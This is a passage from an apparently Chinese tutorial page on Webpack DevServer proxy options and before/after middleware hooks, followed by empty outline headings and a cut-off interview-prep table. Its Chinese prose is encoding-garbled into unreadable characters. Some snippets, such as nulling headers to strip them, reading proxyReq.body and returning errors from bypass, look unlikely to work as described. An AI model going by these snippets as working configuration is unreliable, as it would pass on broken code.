class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-attr">proxy</span>: &#123;<br>  <span class="hljs-string">&#x27;/api&#x27;</span>: &#123;<br>    <span class="hljs-attr">target</span>: <span class="hljs-string">&#x27;http://api.example.com&#x27;</span>,<br>    <span class="hljs-attr">headers</span>: &#123;<br>      <span class="hljs-comment">// é˜»æ­¢æ•æ„Ÿå¤´è½¬å‘</span><br>      <span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-literal">null</span>,<br>      <span class="hljs-string">&#x27;Authorization&#x27;</span>: <span class="hljs-literal">null</span><br>    &#125;,<br>    <span class="hljs-attr">onProxyReq</span>: <span class="hljs-function">(<span class="hljs-params">proxyReq</span>) =&gt;</span> &#123;<br>      <span class="hljs-comment">// æ·»åŠ è‡ªå®šä¹‰å¤´</span><br>      proxyReq.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">&#x27;X-Proxy-Source&#x27;</span>, <span class="hljs-string">&#x27;webpack-dev-server&#x27;</span>);<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) IPç™½åå•æ§åˆ¶</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-attr">proxy</span>: &#123;<br>  <span class="hljs-string">&#x27;/admin&#x27;</span>: &#123;<br>    <span class="hljs-attr">target</span>: <span class="hljs-string">&#x27;http://admin-api.com&#x27;</span>,<br>    <span class="hljs-attr">onProxyReq</span>: <span class="hljs-function">(<span class="hljs-params">proxyReq, req</span>) =&gt;</span> &#123;<br>      <span class="hljs-keyword">const</span> clientIP = req.<span class="hljs-property">connection</span>.<span class="hljs-property">remoteAddress</span>;<br>      <span class="hljs-keyword">if</span> (!allowIPs.<span class="hljs-title function_">includes</span>(clientIP)) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;IP not allowed&#x27;</span>);<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>(3) æ•æ„Ÿè·¯å¾„æ‹¦æˆª</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-attr">bypass</span>: <span class="hljs-function">(<span class="hljs-params">req</span>) =&gt;</span> &#123;<br>  <span class="hljs-comment">// ç¦æ­¢è®¿é—®å†…éƒ¨æ¥å£</span><br>  <span class="hljs-keyword">if</span> (req.<span class="hljs-property">path</span>.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">&#x27;/internal&#x27;</span>)) &#123;<br>    <span class="hljs-keyword">return</span> &#123; <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;Access denied&#x27;</span> &#125;;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>é«˜çº§åº”ç”¨æŠ€å·§</strong></p><p>(1) GraphQLè¯·æ±‚ä»£ç†</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-attr">proxy</span>: &#123;<br>  <span class="hljs-string">&#x27;/graphql&#x27;</span>: &#123;<br>    <span class="hljs-attr">target</span>: <span class="hljs-string">&#x27;http://api.example.com/graphql&#x27;</span>,<br>    <span class="hljs-attr">changeOrigin</span>: <span class="hljs-literal">true</span>,<br>    <span class="hljs-attr">ws</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// æ”¯æŒsubscriptions</span><br>    <span class="hljs-attr">onProxyReq</span>: <span class="hljs-function">(<span class="hljs-params">proxyReq</span>) =&gt;</span> &#123;<br>      <span class="hljs-comment">// ä¿®æ”¹GraphQLè¯·æ±‚ä½“</span><br>      <span class="hljs-keyword">if</span> (proxyReq.<span class="hljs-property">body</span>) &#123;<br>        <span class="hljs-keyword">const</span> body = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(proxyReq.<span class="hljs-property">body</span>);<br>        body.<span class="hljs-property">variables</span> = <span class="hljs-title function_">sanitizeVariables</span>(body.<span class="hljs-property">variables</span>);<br>        proxyReq.<span class="hljs-property">body</span> = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(body);<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) æ–‡ä»¶ä¸Šä¼ ä»£ç†</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-attr">proxy</span>: &#123;<br>  <span class="hljs-string">&#x27;/upload&#x27;</span>: &#123;<br>    <span class="hljs-attr">target</span>: <span class="hljs-string">&#x27;http://file-service.com&#x27;</span>,<br>    <span class="hljs-attr">changeOrigin</span>: <span class="hljs-literal">true</span>,<br>    <span class="hljs-comment">// è§£å†³å¤§æ–‡ä»¶ä¸Šä¼ è¶…æ—¶</span><br>    <span class="hljs-attr">proxyTimeout</span>: <span class="hljs-number">300000</span>,<br>    <span class="hljs-attr">onProxyReq</span>: <span class="hljs-function">(<span class="hljs-params">proxyReq, req</span>) =&gt;</span> &#123;<br>      <span class="hljs-comment">// æµå¼ä¼ è¾“é¿å…å†…å­˜æº¢å‡º</span><br>      <span class="hljs-keyword">if</span> (req.<span class="hljs-property">body</span>) &#123;<br>        req.<span class="hljs-title function_">pipe</span>(proxyReq);<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>(3) SSRè¯·æ±‚ç›´é€š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// next.config.js</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-keyword">async</span> <span class="hljs-title function_">rewrites</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> [<br>      &#123;<br>        <span class="hljs-attr">source</span>: <span class="hljs-string">&#x27;/api/:path*&#x27;</span>,<br>        <span class="hljs-attr">destination</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">PROXY_TARGET</span> + <span class="hljs-string">&#x27;/api/:path*&#x27;</span><br>      &#125;<br>    ]<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="5-2-3-ä¸­é—´ä»¶æ‰©å±•ï¼ˆbefore-afteré’©å­ï¼‰"><a href="#5-2-3-ä¸­é—´ä»¶æ‰©å±•ï¼ˆbefore-afteré’©å­ï¼‰" class="headerlink" title="5.2.3 ä¸­é—´ä»¶æ‰©å±•ï¼ˆbefore&#x2F;afteré’©å­ï¼‰"></a>5.2.3 ä¸­é—´ä»¶æ‰©å±•ï¼ˆ<code>before</code>&#x2F;<code>after</code>é’©å­ï¼‰</h3><p>Webpack DevServer çš„ä¸­é—´ä»¶æ‰©å±•èƒ½åŠ›æ˜¯å¼€å‘ç¯å¢ƒå®šåˆ¶çš„æ ¸å¿ƒï¼Œé€šè¿‡ before å’Œ after é’©å­å®ç°å…¨é“¾è·¯è¯·æ±‚æ‹¦æˆªä¸å¢å¼º</p><p><strong>ä¸­é—´ä»¶æ‰©å±•æ¶æ„å…¨æ™¯</strong></p><pre class="mermaid">graph LR  A[å®¢æˆ·ç«¯è¯·æ±‚] --> B[DevServer]  B --> C[before ä¸­é—´ä»¶]  C --> D[é™æ€èµ„æºå¤„ç†]  D --> E[Webpackç¼–è¯‘]  E --> F[after ä¸­é—´ä»¶]  F --> G[å“åº”å®¢æˆ·ç«¯]</pre><p>æ ¸å¿ƒèƒ½åŠ›ï¼š</p><ul><li>è¯·æ±‚æ‹¦æˆªä¸ä¿®æ”¹</li><li>è‡ªå®šä¹‰è·¯ç”±å¤„ç†</li><li>Mockæ•°æ®æ³¨å…¥</li><li>å®‰å…¨é˜²æŠ¤å¢å¼º</li></ul><p><strong>åŸºç¡€é…ç½®ä¸æ‰§è¡Œé¡ºåº</strong></p><p>(1) é’©å­å‡½æ•°å®šä¹‰</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// webpack.config.js</span><br><span class="hljs-attr">devServer</span>: &#123;<br>  <span class="hljs-attr">before</span>: <span class="hljs-function">(<span class="hljs-params">app, server, compiler</span>) =&gt;</span> &#123;<br>    <span class="hljs-comment">// è¯·æ±‚åˆ°è¾¾Webpackå‰çš„å¤„ç†</span><br>  &#125;,<br>  <span class="hljs-attr">after</span>: <span class="hljs-function">(<span class="hljs-params">app, server, compiler</span>) =&gt;</span> &#123;<br>    <span class="hljs-comment">// å“åº”è¿”å›å‰çš„å¤„ç†</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) å…¸å‹æ‰§è¡Œé¡ºåº</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs Text">1. before ä¸­é—´ä»¶<br>   â”œâ”€â”€ è‡ªå®šä¹‰ä¸­é—´ä»¶A<br>   â”œâ”€â”€ è‡ªå®šä¹‰ä¸­é—´ä»¶B<br>2. Webpackå†…ç½®ä¸­é—´ä»¶ï¼ˆé™æ€æœåŠ¡/HMRï¼‰<br>3. after ä¸­é—´ä»¶<br>   â”œâ”€â”€ æ—¥å¿—è®°å½•<br>   â””â”€â”€ å“åº”ä¿®æ”¹<br></code></pre></td></tr></table></figure><p><strong>before é’©å­é«˜çº§åº”ç”¨</strong></p><p>(1) åŠ¨æ€Mockæ•°æ®</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-attr">before</span>: <span class="hljs-function">(<span class="hljs-params">app</span>) =&gt;</span> &#123;<br>  app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/api/user&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    <span class="hljs-comment">// æ ¹æ®å‚æ•°è¿”å›ä¸åŒæ•°æ®</span><br>    <span class="hljs-keyword">const</span> role = req.<span class="hljs-property">query</span>.<span class="hljs-property">role</span> || <span class="hljs-string">&#x27;user&#x27;</span>;<br>    res.<span class="hljs-title function_">json</span>(&#123;<br>      <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>,<br>      <span class="hljs-attr">name</span>: <span class="hljs-string">`Mock <span class="hljs-subst">$&#123;role&#125;</span>`</span>,<br>      <span class="hljs-attr">permissions</span>: role === <span class="hljs-string">&#x27;admin&#x27;</span> ? [<span class="hljs-string">&#x27;read&#x27;</span>, <span class="hljs-string">&#x27;write&#x27;</span>] : [<span class="hljs-string">&#x27;read&#x27;</span>]<br>    &#125;);<br>  &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) è¯·æ±‚æ‹¦æˆªä¸é‡å®šå‘</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-attr">before</span>: <span class="hljs-function">(<span class="hljs-params">app</span>) =&gt;</span> &#123;<br>  app.<span class="hljs-title function_">use</span>(<span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> &#123;<br>    <span class="hljs-comment">// ç¦æ­¢è®¿é—®æ•æ„Ÿè·¯å¾„</span><br>    <span class="hljs-keyword">if</span> (req.<span class="hljs-property">path</span>.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">&#x27;/internal&#x27;</span>)) &#123;<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Access denied&#x27;</span>);<br>    &#125;<br>    <br>    <span class="hljs-comment">// é‡å®šå‘æ—§è·¯å¾„</span><br>    <span class="hljs-keyword">if</span> (req.<span class="hljs-property">path</span> === <span class="hljs-string">&#x27;/old-api&#x27;</span>) &#123;<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">redirect</span>(<span class="hljs-number">301</span>, <span class="hljs-string">&#x27;/new-api&#x27;</span>);<br>    &#125;<br>    <br>    <span class="hljs-title function_">next</span>();<br>  &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><p>(3) æ¥å£èšåˆï¼ˆBFFå±‚ï¼‰</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-attr">before</span>: <span class="hljs-function">(<span class="hljs-params">app</span>) =&gt;</span> &#123;<br>  app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/page-data&#x27;</span>, <span class="hljs-title function_">async</span> (req, res) =&gt; &#123;<br>    <span class="hljs-comment">// å¹¶è¡Œè¯·æ±‚å¤šä¸ªæ¥å£</span><br>    <span class="hljs-keyword">const</span> [user, products] = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([<br>      <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;http://user-service/user&#x27;</span>),<br>      <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;http://product-service/products&#x27;</span>)<br>    ]);<br>    <br>    res.<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">user</span>: <span class="hljs-keyword">await</span> user.<span class="hljs-title function_">json</span>(), <span class="hljs-attr">products</span>: <span class="hljs-keyword">await</span> products.<span class="hljs-title function_">json</span>() &#125;);<br>  &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>after é’©å­é«˜é˜¶ç”¨æ³•</strong></p><p>(1) å…¨å±€å“åº”åŒ…è£…</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-attr">after</span>: <span class="hljs-function">(<span class="hljs-params">app</span>) =&gt;</span> &#123;<br>  app.<span class="hljs-title function_">use</span>(<span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> originalSend = res.<span class="hljs-property">send</span>;<br>    <br>    <span class="hljs-comment">// æ‹¦æˆªæ‰€æœ‰å“åº”</span><br>    res.<span class="hljs-property">send</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">data</span>) &#123;<br>      <span class="hljs-comment">// ç»Ÿä¸€åŒ…è£…æ ¼å¼</span><br>      <span class="hljs-keyword">const</span> wrappedData = &#123;<br>        <span class="hljs-attr">code</span>: <span class="hljs-number">200</span>,<br>        <span class="hljs-attr">data</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(data),<br>        <span class="hljs-attr">timestamp</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>()<br>      &#125;;<br>      originalSend.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(wrappedData));<br>    &#125;;<br>    <br>    <span class="hljs-title function_">next</span>();<br>  &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) æ€§èƒ½ç›‘æ§åŸ‹ç‚¹</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-attr">after</span>: <span class="hljs-function">(<span class="hljs-params">app</span>) =&gt;</span> &#123;<br>  app.<span class="hljs-title function_">use</span>(<span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> start = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();<br>    <br>    res.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;finish&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-keyword">const</span> duration = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() - start;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[<span class="hljs-subst">$&#123;req.method&#125;</span>] <span class="hljs-subst">$&#123;req.url&#125;</span> - <span class="hljs-subst">$&#123;duration&#125;</span>ms`</span>);<br>      <br>      <span class="hljs-comment">// ä¸ŠæŠ¥åˆ°ç›‘æ§ç³»ç»Ÿ</span><br>      perfMonitor.<span class="hljs-title function_">track</span>(&#123;<br>        <span class="hljs-attr">path</span>: req.<span class="hljs-property">path</span>,<br>        <span class="hljs-attr">method</span>: req.<span class="hljs-property">method</span>,<br>        duration<br>      &#125;);<br>    &#125;);<br>    <br>    <span class="hljs-title function_">next</span>();<br>  &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><p>(3) å®‰å…¨å“åº”å¤´æ³¨å…¥</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-attr">after</span>: <span class="hljs-function">(<span class="hljs-params">app</span>) =&gt;</span> &#123;<br>  app.<span class="hljs-title function_">use</span>(<span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> &#123;<br>    <span class="hljs-comment">// æ·»åŠ å®‰å…¨å¤´</span><br>    res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">&#x27;X-Content-Type-Options&#x27;</span>, <span class="hljs-string">&#x27;nosniff&#x27;</span>);<br>    res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">&#x27;Content-Security-Policy&#x27;</span>, <span class="hljs-string">&quot;default-src &#x27;self&#x27;&quot;</span>);<br>    res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">&#x27;Strict-Transport-Security&#x27;</span>, <span class="hljs-string">&#x27;max-age=31536000&#x27;</span>);<br>    <br>    <span class="hljs-title function_">next</span>();<br>  &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="å…­ã€åŸç†ä¸æºç å±‚"><a href="#å…­ã€åŸç†ä¸æºç å±‚" class="headerlink" title="å…­ã€åŸç†ä¸æºç å±‚"></a>å…­ã€åŸç†ä¸æºç å±‚</h1><h2 id="6-1-Tapableäº‹ä»¶æµæœºåˆ¶"><a href="#6-1-Tapableäº‹ä»¶æµæœºåˆ¶" class="headerlink" title="6.1 Tapableäº‹ä»¶æµæœºåˆ¶"></a>6.1 Tapableäº‹ä»¶æµæœºåˆ¶</h2><h3 id="6-1-1-åŒæ­¥-å¼‚æ­¥é’©å­è°ƒç”¨æµç¨‹"><a href="#6-1-1-åŒæ­¥-å¼‚æ­¥é’©å­è°ƒç”¨æµç¨‹" class="headerlink" title="6.1.1 åŒæ­¥&#x2F;å¼‚æ­¥é’©å­è°ƒç”¨æµç¨‹"></a>6.1.1 åŒæ­¥&#x2F;å¼‚æ­¥é’©å­è°ƒç”¨æµç¨‹</h3><h3 id="6-1-2-æ’ä»¶æ³¨å†Œä¸è§¦å‘åŸç†"><a href="#6-1-2-æ’ä»¶æ³¨å†Œä¸è§¦å‘åŸç†" class="headerlink" title="6.1.2 æ’ä»¶æ³¨å†Œä¸è§¦å‘åŸç†"></a>6.1.2 æ’ä»¶æ³¨å†Œä¸è§¦å‘åŸç†</h3><h2 id="6-2-ASTåº”ç”¨"><a href="#6-2-ASTåº”ç”¨" class="headerlink" title="6.2 ASTåº”ç”¨"></a>6.2 ASTåº”ç”¨</h2><h3 id="6-2-1-Loaderä¸­çš„ASTæ“ä½œï¼ˆBabel-Parseræ¡ˆä¾‹ï¼‰"><a href="#6-2-1-Loaderä¸­çš„ASTæ“ä½œï¼ˆBabel-Parseræ¡ˆä¾‹ï¼‰" class="headerlink" title="6.2.1 Loaderä¸­çš„ASTæ“ä½œï¼ˆBabel Parseræ¡ˆä¾‹ï¼‰"></a>6.2.1 Loaderä¸­çš„ASTæ“ä½œï¼ˆBabel Parseræ¡ˆä¾‹ï¼‰</h3><h3 id="6-2-2-ä¾èµ–å›¾ï¼ˆDependency-Graphï¼‰ç”Ÿæˆè¿‡ç¨‹"><a href="#6-2-2-ä¾èµ–å›¾ï¼ˆDependency-Graphï¼‰ç”Ÿæˆè¿‡ç¨‹" class="headerlink" title="6.2.2 ä¾èµ–å›¾ï¼ˆDependency Graphï¼‰ç”Ÿæˆè¿‡ç¨‹"></a>6.2.2 ä¾èµ–å›¾ï¼ˆDependency Graphï¼‰ç”Ÿæˆè¿‡ç¨‹</h3><h2 id="6-3-æ ¸å¿ƒæµç¨‹æºç è§£æ"><a href="#6-3-æ ¸å¿ƒæµç¨‹æºç è§£æ" class="headerlink" title="6.3 æ ¸å¿ƒæµç¨‹æºç è§£æ"></a>6.3 æ ¸å¿ƒæµç¨‹æºç è§£æ</h2><h3 id="6-3-1-ç¼–è¯‘é˜¶æ®µï¼šModule-â†’-Chunk-â†’-Asset-è½¬æ¢"><a href="#6-3-1-ç¼–è¯‘é˜¶æ®µï¼šModule-â†’-Chunk-â†’-Asset-è½¬æ¢" class="headerlink" title="6.3.1 ç¼–è¯‘é˜¶æ®µï¼šModule â†’ Chunk â†’ Asset è½¬æ¢"></a>6.3.1 ç¼–è¯‘é˜¶æ®µï¼šModule â†’ Chunk â†’ Asset è½¬æ¢</h3><h3 id="6-3-2-è¾“å‡ºé˜¶æ®µï¼šTemplateæ¸²æŸ“ä¸æ–‡ä»¶ç”Ÿæˆ"><a href="#6-3-2-è¾“å‡ºé˜¶æ®µï¼šTemplateæ¸²æŸ“ä¸æ–‡ä»¶ç”Ÿæˆ" class="headerlink" title="6.3.2 è¾“å‡ºé˜¶æ®µï¼šTemplateæ¸²æŸ“ä¸æ–‡ä»¶ç”Ÿæˆ"></a>6.3.2 è¾“å‡ºé˜¶æ®µï¼šTemplateæ¸²æŸ“ä¸æ–‡ä»¶ç”Ÿæˆ</h3><h1 id="ä¸ƒã€ç”Ÿæ€ä¸æœªæ¥è¶‹åŠ¿"><a href="#ä¸ƒã€ç”Ÿæ€ä¸æœªæ¥è¶‹åŠ¿" class="headerlink" title="ä¸ƒã€ç”Ÿæ€ä¸æœªæ¥è¶‹åŠ¿"></a>ä¸ƒã€ç”Ÿæ€ä¸æœªæ¥è¶‹åŠ¿</h1><h2 id="7-1-Webpack-5-æ–°ç‰¹æ€§"><a href="#7-1-Webpack-5-æ–°ç‰¹æ€§" class="headerlink" title="7.1 Webpack 5 æ–°ç‰¹æ€§"></a>7.1 Webpack 5 æ–°ç‰¹æ€§</h2><h3 id="7-1-1-æŒä¹…åŒ–ç¼“å­˜ï¼ˆpersistentCacheï¼‰"><a href="#7-1-1-æŒä¹…åŒ–ç¼“å­˜ï¼ˆpersistentCacheï¼‰" class="headerlink" title="7.1.1 æŒä¹…åŒ–ç¼“å­˜ï¼ˆpersistentCacheï¼‰"></a>7.1.1 æŒä¹…åŒ–ç¼“å­˜ï¼ˆ<code>persistentCache</code>ï¼‰</h3><h3 id="7-1-2-æ¨¡å—è”é‚¦ï¼ˆModule-Federationï¼‰"><a href="#7-1-2-æ¨¡å—è”é‚¦ï¼ˆModule-Federationï¼‰" class="headerlink" title="7.1.2 æ¨¡å—è”é‚¦ï¼ˆModule Federationï¼‰"></a>7.1.2 æ¨¡å—è”é‚¦ï¼ˆModule Federationï¼‰</h3><h3 id="7-1-3-Asset-Modulesèµ„æºå¤„ç†"><a href="#7-1-3-Asset-Modulesèµ„æºå¤„ç†" class="headerlink" title="7.1.3 Asset Modulesèµ„æºå¤„ç†"></a>7.1.3 Asset Modulesèµ„æºå¤„ç†</h3><h2 id="7-2-ä¸æ–°å…´å·¥å…·åä½œ"><a href="#7-2-ä¸æ–°å…´å·¥å…·åä½œ" class="headerlink" title="7.2 ä¸æ–°å…´å·¥å…·åä½œ"></a>7.2 ä¸æ–°å…´å·¥å…·åä½œ</h2><h3 id="7-2-1-Webpack-Vite-æ··åˆå¼€å‘æ¨¡å¼"><a href="#7-2-1-Webpack-Vite-æ··åˆå¼€å‘æ¨¡å¼" class="headerlink" title="7.2.1 Webpack + Vite æ··åˆå¼€å‘æ¨¡å¼"></a>7.2.1 Webpack + Vite æ··åˆå¼€å‘æ¨¡å¼</h3><h3 id="7-2-2-Rustå·¥å…·é“¾é›†æˆï¼ˆswc-loaderæ›¿ä»£Babelï¼‰"><a href="#7-2-2-Rustå·¥å…·é“¾é›†æˆï¼ˆswc-loaderæ›¿ä»£Babelï¼‰" class="headerlink" title="7.2.2 Rustå·¥å…·é“¾é›†æˆï¼ˆswc-loaderæ›¿ä»£Babelï¼‰"></a>7.2.2 Rustå·¥å…·é“¾é›†æˆï¼ˆ<code>swc-loader</code>æ›¿ä»£Babelï¼‰</h3><hr><h1 id="å…«ã€é¢è¯•ä¸“é¡¹å‡†å¤‡å»ºè®®"><a href="#å…«ã€é¢è¯•ä¸“é¡¹å‡†å¤‡å»ºè®®" class="headerlink" title="å…«ã€é¢è¯•ä¸“é¡¹å‡†å¤‡å»ºè®®"></a>å…«ã€é¢è¯•ä¸“é¡¹å‡†å¤‡å»ºè®®</h1><h2 id="8-1-é«˜é¢‘è€ƒç‚¹"><a href="#8-1-é«˜é¢‘è€ƒç‚¹" class="headerlink" title="8.1 é«˜é¢‘è€ƒç‚¹"></a>8.1 é«˜é¢‘è€ƒç‚¹</h2><h3 id="8-1-1-Tree-Shakingæ¡ä»¶ä¸å‰¯ä½œç”¨å¤„ç†"><a href="#8-1-1-Tree-Shakingæ¡ä»¶ä¸å‰¯ä½œç”¨å¤„ç†" class="headerlink" title="8.1.1 Tree Shakingæ¡ä»¶ä¸å‰¯ä½œç”¨å¤„ç†"></a>8.1.1 Tree Shakingæ¡ä»¶ä¸å‰¯ä½œç”¨å¤„ç†</h3><p><strong>Tree Shaking ç”Ÿæ•ˆçš„å››å¤§æ ¸å¿ƒæ¡ä»¶</strong></p><table><thead><tr><th align="left">æ¡ä»¶</th><th align="left">åŸç†è¯´æ˜</th><th align="left">éªŒè¯æ–¹å¼</th></tr></thead><tbody><tr><td align="left">1. ES Module è¯­æ³•</td><td align="left">é™æ€åˆ†æä¾èµ–å…³ç³»ï¼ˆimport&#x2F;exportï¼‰</td><td align="left">æ£€æŸ¥æ˜¯å¦ä½¿ç”¨ require</td></tr><tr><td align="left">2. ç”Ÿäº§æ¨¡å¼ï¼ˆmode: 